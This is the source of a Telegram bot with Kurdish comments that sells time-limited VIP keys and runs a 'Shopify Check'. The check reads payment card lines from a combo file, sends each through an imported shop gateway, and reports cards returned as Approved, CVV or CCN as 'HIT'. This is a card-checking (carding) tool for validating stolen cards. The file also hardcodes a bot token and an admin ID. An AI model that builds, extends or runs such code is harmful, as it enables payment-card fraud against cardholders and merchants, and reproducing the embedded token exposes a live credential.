import telebot, os, json, random, string
from telebot import types
from datetime import datetime, timedelta
from gatet import ShopProcessor # بانگکرنا گەیتێ
from reg import reg              # بانگکرنا فێلتەری

# --- زانیاریێن بۆتی ---
token = '8243541935:AAG2BVXMP-N88c16rZHrO4zLYDPC2uI5Rpc' 
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6421172099 

# دروستکرنا فایلا داتا ئەگەر نەبیت
if not os.path.exists('data.json'):
    with open('data.json', 'w') as f: json.dump({}, f)

# --- فەرمانا دروستکرنا کلیلێ (تنێ بۆ ئەدمینی) ---
@bot.message_handler(commands=["code"])
def create_code(message):
    if message.from_user.id != admin: return
    try:
        # نموونە: /code 24 (بۆ ٢٤ دەمژمێران)
        h = float(message.text.split(' ')[1])
        with open('data.json', 'r') as f: data = json.load(f)
        
        characters = string.ascii_uppercase + string.digits
        key = 'NEJA79-' + '-'.join(''.join(random.choices(characters, k=4)) for _ in range(3))
        
        expire_date = (datetime.now() + timedelta(hours=h)).strftime("%Y-%m-%d %H:%M")
        data[key] = {"plan": "𝗩𝗜𝗣", "time": expire_date}
        
        with open('data.json', 'w') as f: json.dump(data, f, indent=4)
        
        bot.reply_to(message, f"<b>✅ NEW KEY CREATED\n\nPLAN: VIP\nEXPIRE: {expire_date}\nKEY: <code>/redeem {key}</code></b>")
    except:
        bot.reply_to(message, "<b>Use: /code 24</b>")

# --- فەرمانا ئەکتیڤکرنا کلیلێ ---
@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    id = str(message.from_user.id)
    try:
        key = message.text.split(' ')[1]
        with open('data.json', 'r') as f: data = json.load(f)
        
        if key in data:
            data[id] = {"plan": "𝗩𝗜𝗣", "timer": data[key]['time']}
            del data[key] # سڕینا کلیلێ پشتی بکارئینانێ
            with open('data.json', 'w') as f: json.dump(data, f, indent=4)
            bot.reply_to(message, "<b>🎉 VIP Activated Successfully!</b>")
        else:
            bot.reply_to(message, "<b>Invalid or Used Key! ❌</b>")
    except:
        bot.reply_to(message, "<b>Use: /redeem NEJA79-XXXX...</b>")

# --- بەشێ فەحسکرنا فایلان ---
@bot.callback_query_handler(func=lambda call: call.data == 'run_chk')
def start_checking(call):
    bot.edit_message_text("<b>Starting Shopify Check... 🚀</b>", call.message.chat.id, call.message.message_id)
    with open("combo.txt", "r") as f: cards = f.readlines()
    
    checker = ShopProcessor() # ئامادەکرنا گەیتێ
    
    for card in cards:
        card = card.strip()
        formatted = reg(card) # ڕێکخستنا کارتێ
        if not formatted: continue
        
        try:
            result = checker.execute(formatted) 
            if any(x in result for x in ["Approved", "CVV", "CCN", "1000"]):
                bot.send_message(call.message.chat.id, f"<b>✅ HIT!\n💳 Card: <code>{formatted}</code>\n📝 Result: {result}</b>")
        except: continue
    bot.send_message(call.message.chat.id, "<b>Checking Finished! ✅</b>")

# زێدەکرنا فەرمانا Start و Document ل لایێ خۆ...
bot.infinity_polling()
